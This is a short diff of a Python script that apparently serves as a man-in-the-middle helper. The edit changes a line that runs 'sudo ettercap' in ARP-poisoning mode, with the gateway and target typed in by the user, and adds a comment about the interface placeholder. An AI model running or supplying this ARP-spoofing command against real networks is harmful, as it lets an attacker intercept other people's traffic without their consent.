@@ -14,4 +14,5 @@ print()
 print(Fore.GREEN + "Scan is complete! Choose your MITM target below!")
 print()
 print(Fore.RED)
-attack1 = os.system("sudo ettercap -T -S -i Add connection here -M arp:remote /" + (input("First add gateway: ") + "//" + (input("Add target: ") + "//")))
+attack1 = os.system("sudo ettercap -T -S -i <Add connection here> -M arp:remote /" + (input("First add gateway: ") + "//" + (input("Add target: ") + "//")))
+# Delete '< >' when adding your conection point/driver.
